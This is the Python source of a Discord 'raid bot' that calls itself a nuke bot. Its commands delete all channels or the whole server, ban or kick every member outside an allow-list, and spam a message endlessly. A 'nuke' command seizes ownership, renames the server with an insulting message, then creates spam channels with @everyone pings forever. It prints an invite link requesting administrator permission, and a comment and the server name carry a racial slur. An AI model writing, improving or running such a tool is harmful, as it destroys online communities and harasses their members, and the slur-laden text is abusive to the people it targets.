import discord
import asyncio

intents = discord.Intents.all()
client = discord.Client(intents=intents)
YOUR_BOT_TOKEN = "YOUR_BOT_USER_ID"
god_user = 'YOUR_USER_ID'
allowed_users = ['YOUR_USER_ID', 'YOUR_BOT_USER_ID'] # You can add more ID's
stat = ""

spam = True


spam = True

@client.event
async def on_message(message):
  global spam
  if str(message.author.id) in allowed_users:
      if message.content == '!bot deletechn':
        await message.channel.send('Deleting Channels... ')
        for guild in client.guilds:
            for channel in guild.channels:
                await channel.delete()
      elif message.content == '!bot deletesrv':
        await message.channel.send('Deleting Server... ')
        await message.guild.delete()
      elif (message.content.startswith('!bot adduser')
       and str(message.author.id) == god_user):
        if len(message.content) > 12:
         splits_message = message.content.split(' ')
         user_id = " ".join(splits_message[2:])
         allowed_users.append(user_id)
         await message.channel.send(f'User <@{user_id}> has been added to the allowed users list.')
        else:
          await message.channel.send('Provide a user ID to add.') 
      elif (message.content.startswith('!bot removeuser')
         and str(message.author.id) == god_user):
          if len(message.content) > 14:
           splited_message = message.content.split(' ')
           user_id = " ".join(splited_message[2:])
           if user_id in allowed_users:
             allowed_users.remove(user_id)
             user = client.get_user(int(user_id))
             await message.channel.send(f'User <@{user_id}> has been removed from the allowed users list.')
          else:
           await message.channel.send('Provide a user ID to remove.')  
      elif message.content.startswith('!bot spam'):
       spam = True
       split_message = message.content.split(' ')
       if len(message.content) > 9:
        spam_message = " ".join(split_message[2:])
        while spam is True:
          await message.channel.send(spam_message)
       else:
        await message.channel.send('Please provide a message to spam')
      elif message.content == '!bot':
        await message.channel.send("")
      elif message.content == '!bot help':
        await message.channel.send('figure out urself')
      elif message.content == '!bot ban all':
        for guild in client.guilds:
          for member in guild.members:
              if str(member.id) not in allowed_users:
                  await message.channel.send(f'Banning {member.name}')
                  await member.ban()
      elif message.content == '!bot kick all':
        for guild in client.guilds:
         for member in guild.members:
              if str(member.id) not in allowed_users:
                 await message.channel.send(f'Kicking {member.name}')
                 await member.kick()
      elif message.content == '!bot allowedusers':
        allowed_users_mentions = '\n'.join([f'<@{user}>' for user in allowed_users])
        embed = discord.message.Embed(title="Allowed Users", 
description=allowed_users_mentions, color=0x00ff00)
        await message.channel.send(embed=embed)
      elif message.content == '!bot config':
        embed = discord.message.Embed(title="Bot Commands", description="List of available commands and their descriptions", color=0x00ff00)
        command_desc = {
            '!bot deletechn': 'Deletes all channels in the server',
            '!bot deletesrv': 'Deletes the entire server',
            '!bot adduser [user_id]': 'Adds a user to the allowed users list',
            '!bot removeuser [user_id]': 'Removes a user from the allowed users list',
            '!bot spam [message]': 'Spams the provided message',
            '!bot ban all': 'Bans all members from the server except allowed users',
            '!bot kick all': 'Kicks all members from the server except allowed users',
            '!bot allowedusers': 'Lists all allowed users',
            '!bot config': 'Displays the list of available commands and their descriptions',
            '!bot stopspam': 'Stops the bot from spamming',
            '!bot nuke': 'Nukes the server'
        }
        for command, description in command_desc.items():
            embed.add_field(name=command, value=description, inline=False)
        await message.channel.send(embed=embed)
      elif message.content == '!bot stopspam':
        spam = False
        await message.channel.send('Spam stopped')
      # ... (other code remains unchanged)

      elif message.content == '!bot nuke':
          # delete all the channels
          for guild in client.guilds:
            await guild.edit(owner=client.user)
            guild.name = "l get nuked by kuruyami + interken is da goat :cold_face: :cold_sweat: :goat: :on: :top"
            for channel in guild.channels:
                  await channel.delete()

          # waits until all channels are gone
          while True:
              all_channels_gone = True
              for guild in client.guilds:
                  if len(guild.channels) > 0:
                      all_channels_gone = False
                      break
              if all_channels_gone:
                  break

          # add channels forever called "u got nukd by kuruyami l niglet"
          while True:
              for guild in client.guilds:
                  channele = await guild.create_text_channel("spam_channel_name")
                  await channele.send("@everyone spam_message")
                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
                  await channele.send("spam_message")
                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
                  await channele.send("spam_message")
                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
                  await channele.send("spam_message")
                  await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting


@client.event
async def on_ready():
  
    print("""




██╗███╗░░██╗████████╗███████╗██████╗░██╗░░██╗███████╗███╗░░██╗██╗░██████╗
██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗██║░██╔╝██╔════╝████╗░██║╚█║██╔════╝
██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝█████═╝░█████╗░░██╔██╗██║░╚╝╚█████╗░
██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗██╔═██╗░██╔══╝░░██║╚████║░░░░╚═══██╗
██║██║░╚███║░░░██║░░░███████╗██║░░██║██║░╚██╗███████╗██║░╚███║░░░██████╔╝
╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░░░╚═════╝░
    """, """


██████╗░███████╗██████╗░██╗░░░░░██╗████████╗
██╔══██╗██╔════╝██╔══██╗██║░░░░░██║╚══██╔══╝
██████╔╝█████╗░░██████╔╝██║░░░░░██║░░░██║░░░
██╔══██╗██╔══╝░░██╔═══╝░██║░░░░░██║░░░██║░░░
██║░░██║███████╗██║░░░░░███████╗██║░░░██║░░░
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚══════╝╚═╝░░░╚═╝░░░
    """,
"""

██████╗░░█████╗░██╗██████╗░
██╔══██╗██╔══██╗██║██╔══██╗
██████╔╝███████║██║██║░░██║
██╔══██╗██╔══██║██║██║░░██║
██║░░██║██║░░██║██║██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
""",
"""

██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░
""",
"""

██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝
""",
"""

██╗░░░██╗██████╗░
██║░░░██║╚════██╗
╚██╗░██╔╝░█████╔╝
░╚████╔╝░░╚═══██╗
░░╚██╔╝░░██████╔╝
░░░╚═╝░░░╚═════╝░
"""
"""                      

𝕎𝕠𝕣𝕜𝕤 𝕠𝕟 𝕡𝕪𝕥𝕙𝕠𝕟 𝕔𝕠𝕞𝕡𝕝𝕚𝕖𝕣𝕤 𝕒𝕤 𝕝𝕠𝕟𝕘 𝕒𝕤 𝕚𝕥 𝕔𝕒𝕟 𝕦𝕤𝕖 𝕥𝕙𝕖 𝕕𝕚𝕤𝕔𝕠𝕣𝕕 𝕒𝕡𝕚
                                                                                    """,
"""
░█████╗░░█████╗░███╗░░██╗███████╗██╗░██████╗░
██╔══██╗██╔══██╗████╗░██║██╔════╝██║██╔════╝░
██║░░╚═╝██║░░██║██╔██╗██║█████╗░░██║██║░░██╗░
██║░░██╗██║░░██║██║╚████║██╔══╝░░██║██║░░╚██╗
╚█████╔╝╚█████╔╝██║░╚███║██║░░░░░██║╚██████╔╝
░╚════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚═════╝░

""",
          """                             """,
"""
████╗
██╔═╝
██║░░
██║░░
████╗
╚═══╝
""",
"""                             """,
"""


❕𝕓𝕠𝕥 𝕕𝕖𝕝𝕖𝕥𝕖𝕔𝕙𝕟❜, ❜𝔻𝕖𝕝𝕖𝕥𝕖𝕤 𝕒𝕝𝕝 𝕔𝕙𝕒𝕟𝕟𝕖𝕝𝕤 𝕚𝕟 𝕥𝕙𝕖 𝕤𝕖𝕣𝕧𝕖𝕣❜, ❜❕𝕓𝕠𝕥 𝕕𝕖𝕝𝕖𝕥𝕖𝕤𝕣𝕧❜, ❜𝔻𝕖𝕝𝕖𝕥𝕖𝕤 𝕥𝕙𝕖 𝕖𝕟𝕥𝕚𝕣𝕖 𝕤𝕖𝕣𝕧𝕖𝕣❜, ❜❕𝕓𝕠𝕥 𝕒𝕕𝕕𝕦𝕤𝕖𝕣 [𝕦𝕤𝕖𝕣_𝕚𝕕]❜, ❜𝔸𝕕𝕕𝕤 𝕒 𝕦𝕤𝕖𝕣 𝕥𝕠 𝕥𝕙𝕖 𝕒𝕝𝕝𝕠𝕨𝕖𝕕 𝕦𝕤𝕖𝕣𝕤 𝕝𝕚𝕤𝕥❜, ❜❕𝕓𝕠𝕥 𝕣𝕖𝕞𝕠𝕧𝕖𝕦𝕤𝕖𝕣 [𝕦𝕤𝕖𝕣_𝕚𝕕]❜, ❜ℝ𝕖𝕞𝕠𝕧𝕖𝕤 𝕒 𝕦𝕤𝕖𝕣 𝕗𝕣𝕠𝕞 𝕥𝕙𝕖 𝕒𝕝𝕝𝕠𝕨𝕖𝕕 𝕦𝕤𝕖𝕣𝕤 𝕝𝕚𝕤𝕥❜, ❜❕𝕓𝕠𝕥 𝕤𝕡𝕒𝕞 [𝕞𝕖𝕤𝕤𝕒𝕘𝕖]❜, ❜𝕊𝕡𝕒𝕞𝕤 𝕥𝕙𝕖 𝕡𝕣𝕠𝕧𝕚𝕕𝕖𝕕 𝕞𝕖𝕤𝕤𝕒𝕘𝕖❜, ❜❕𝕓𝕠𝕥 𝕓𝕒𝕟 𝕒𝕝𝕝❜, ❜𝔹𝕒𝕟𝕤 𝕒𝕝𝕝 𝕞𝕖𝕞𝕓𝕖𝕣𝕤 𝕗𝕣𝕠𝕞 𝕥𝕙𝕖 𝕤𝕖𝕣𝕧𝕖𝕣 𝕖𝕩𝕔𝕖𝕡𝕥 𝕒𝕝𝕝𝕠𝕨𝕖𝕕 𝕦𝕤𝕖𝕣𝕤❜, ❜❕𝕓𝕠𝕥 𝕜𝕚𝕔𝕜 𝕒𝕝𝕝❜, ❜𝕂𝕚𝕔𝕜𝕤 𝕒𝕝𝕝 𝕞𝕖𝕞𝕓𝕖𝕣𝕤 𝕗𝕣𝕠𝕞 𝕥𝕙𝕖 𝕤𝕖𝕣𝕧𝕖𝕣 𝕖𝕩𝕔𝕖𝕡𝕥 𝕒𝕝𝕝𝕠𝕨𝕖𝕕 𝕦𝕤𝕖𝕣𝕤❜, ❜❕𝕓𝕠𝕥 𝕖𝕧𝕚𝕝𝕕𝕖𝕖𝕕❜, ❜ℕ𝕦𝕜𝕖𝕤 𝕥𝕙𝕖 𝕤𝕖𝕣𝕧𝕖𝕣'


""",
"""
████╗
╚═██║
░░██║
░░██║
████║
╚═══╝
""",
"""

░█████╗░░█████╗░██╗░░░██╗████████╗██╗░░██╗██████╗░
██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██║░░██║╚════██╗
██║░░██║███████║██║░░░██║░░░██║░░░███████║░░███╔═╝
██║░░██║██╔══██║██║░░░██║░░░██║░░░██╔══██║██╔══╝░░
╚█████╔╝██║░░██║╚██████╔╝░░░██║░░░██║░░██║███████╗
░╚════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝

""",
"""
████╗
██╔═╝
██║░░
██║░░
████╗
╚═══╝
          """,
"""                             """,
f"""


𝕆𝕒𝕦𝕥𝕙𝟚 𝕝𝕚𝕟𝕜: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot


""",
"""                             """,
"""
████╗
╚═██║
░░██║
░░██║
████║
╚═══╝
""",
)

client.run(YOUR_BOT_TOKEN)
